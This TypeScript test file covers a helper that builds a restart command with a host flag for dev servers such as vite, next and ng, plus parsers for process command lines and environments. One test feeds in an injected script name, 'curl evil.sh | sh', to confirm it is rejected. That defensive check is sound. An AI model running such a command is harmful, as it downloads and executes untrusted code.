import { test } from 'node:test';
import assert from 'node:assert';
import { spawn } from 'node:child_process';
import {
  buildNetworkCommand, parseScriptEnv, runningProgram, runningSameScript, splitCommandLine, splitPsEnvironment,
} from '../src/restartCommand.ts';
import { listProcesses } from '../src/processes.ts';

const build = (script: string, body: unknown, program: string | undefined, packageManager = 'npm') =>
  buildNetworkCommand({ script, body, program, packageManager });

test('restarts the script that is running, with the tool\'s host flag', () => {
  assert.strictEqual(build('dev', 'vite --port 3000', 'vite'), 'npm run dev -- --host');
  // Whatever subcommand the script runs is what was running, so it is what runs again.
  assert.strictEqual(build('preview', 'vite preview', 'vite'), 'npm run preview -- --host');
  assert.strictEqual(build('start', 'ng serve', 'ng'), 'npm run start -- --host 0.0.0.0');
});

test('passes the flag straight through for other package managers', () => {
  assert.strictEqual(build('dev', 'next dev', 'next-server', 'pnpm'), 'pnpm run dev -H 0.0.0.0');
});

test('never offers a script name that could inject shell commands or options', () => {
  assert.strictEqual(build('dev; curl evil.sh | sh; #', 'vite', 'vite'), undefined);
  assert.strictEqual(build('--dev', 'vite', 'vite'), undefined);
});

test('does not replace a server that is not one of the known tools', () => {
  // Laravel ships "dev": "vite" for its assets; restarting would swap the app for the asset server.
  assert.strictEqual(build('dev', 'vite', 'php'), undefined);
  assert.strictEqual(build('start', 'node server.js', 'server'), undefined);
  assert.strictEqual(build('dev', 'vite', undefined), undefined);
  // A script file named after the tool isn't the tool.
  assert.strictEqual(build('dev', 'node scripts/vite.js', 'vite'), undefined);
});

test('skips scripts the flag would not reach, or that already set a host', () => {
  assert.strictEqual(build('dev', 'vite && echo done', 'vite'), undefined);
  assert.strictEqual(build('dev', 'concurrently "vite" "node api.js"', 'vite'), undefined);
  assert.strictEqual(build('dev', 'vite > vite.log', 'vite'), undefined);
  assert.strictEqual(build('dev', 'vite --host localhost', 'vite'), undefined);
  assert.strictEqual(build('dev', undefined, 'vite'), undefined);
});

test('runningProgram finds the tool behind the runtime, not in folders or arguments', () => {
  assert.strictEqual(runningProgram(['node', '--max-old-space-size=4096', '/app/node_modules/vite/bin/vite.js']), 'vite');
  assert.strictEqual(runningProgram(['node', '/app/node_modules/nuxt/bin/nuxt.mjs', 'dev']), 'nuxt');
  assert.strictEqual(runningProgram(['/usr/local/bin/node', '/Users/me/My Projects/node_modules/.bin/nuxi', 'dev']), 'nuxi');
  assert.strictEqual(runningProgram(['ng', 'serve']), 'ng');
  assert.strictEqual(runningProgram(['next-server (v15.0.0)']), 'next-server');
  assert.strictEqual(runningProgram(['node', '/Users/me/vite/server.js']), 'server');
  assert.strictEqual(runningProgram(['node', 'server.js', '--preset', 'next']), 'server');
  assert.strictEqual(runningProgram(['node']), undefined);
  assert.strictEqual(runningProgram([]), undefined);
});

test('splitCommandLine rejoins paths that contain spaces', async () => {
  const files = new Set(['/usr/local/bin/node', '/Users/me/My  Projects/app/node_modules/.bin/vite']);
  const exists = async (file: string) => files.has(file);
  assert.deepStrictEqual(
    await splitCommandLine('/usr/local/bin/node /Users/me/My  Projects/app/node_modules/.bin/vite --port 3000 ', exists),
    ['/usr/local/bin/node', '/Users/me/My  Projects/app/node_modules/.bin/vite', '--port', '3000']);
  // A path that doesn't exist stays split rather than swallowing the arguments.
  assert.deepStrictEqual(await splitCommandLine('node /gone/vite --open /tmp', exists), ['node', '/gone/vite', '--open', '/tmp']);
});

test('parseScriptEnv reads the script, package.json and package manager', () => {
  assert.deepStrictEqual(parseScriptEnv([
    'HOME=/Users/me', 'npm_lifecycle_event=start', 'npm_lifecycle_event=dev',
    'npm_package_json=/app/package.json', 'npm_config_user_agent=pnpm/9.1.0 npm/? node/v20.11.0 darwin arm64',
  ]), { event: 'dev', packageJson: '/app/package.json', packageName: undefined, packageManager: 'pnpm' });
  assert.deepStrictEqual(parseScriptEnv(['npm_lifecycle_event=dev', 'npm_config_user_agent=cnpm/1.0']),
    { event: 'dev', packageJson: undefined, packageName: undefined, packageManager: undefined });
  assert.strictEqual(parseScriptEnv(['HOME=/Users/me', '']), undefined);
});

test('splitPsEnvironment keeps values with spaces whole and drops the command line', () => {
  const output = 'node /My Apps/node_modules/.bin/vite HOME=/Users/me npm_package_json=/Users/me/My  Projects/app/package.json ' +
    'npm_config_user_agent=npm/10.8.0 node/v22.18.0 darwin arm64 workspaces/false\n';
  assert.deepStrictEqual(splitPsEnvironment(output), [
    'HOME=/Users/me',
    'npm_package_json=/Users/me/My  Projects/app/package.json',
    'npm_config_user_agent=npm/10.8.0 node/v22.18.0 darwin arm64 workspaces/false',
  ]);
  assert.deepStrictEqual(splitPsEnvironment(''), []);
});

test('runningSameScript finds the processes of the server\'s own script, not the one that started it', async t => {
  if (process.platform === 'win32') return t.skip('reads the environment with ps or /proc');
  const env = (pkg: string) => ({ ...process.env, npm_lifecycle_event: 'dev', npm_package_json: `/repo/${pkg}/package.json` });
  // root's dev script (concurrently, say) → web's dev script (sh) → the server, which prints the pids and waits.
  const server = 'console.log([process.pid, process.ppid].join(" ")); setTimeout(() => {}, 10000)';
  const sh = `require("child_process").spawn(process.execPath, ["-e", ${JSON.stringify(server)}], { stdio: "inherit" }); setTimeout(() => {}, 10000)`;
  const root = `require("child_process").spawn(process.execPath, ["-e", ${JSON.stringify(sh)}], { stdio: "inherit", env: ${JSON.stringify(env('web'))} }); setTimeout(() => {}, 10000)`;
  const child = spawn(process.execPath, ['-e', root], { env: env('root'), stdio: ['ignore', 'pipe', 'inherit'] });
  let pids: number[] = [];
  try {
    pids = (await new Promise<string>(resolve => child.stdout.once('data', resolve))).toString().trim().split(' ').map(Number);
    const [serverPid, shPid] = pids;
    const same = await runningSameScript(serverPid, await listProcesses());
    assert.deepStrictEqual([...same].sort(), [serverPid, shPid].sort());
  } finally {
    for (const pid of [...pids, child.pid!]) process.kill(pid);
  }
});
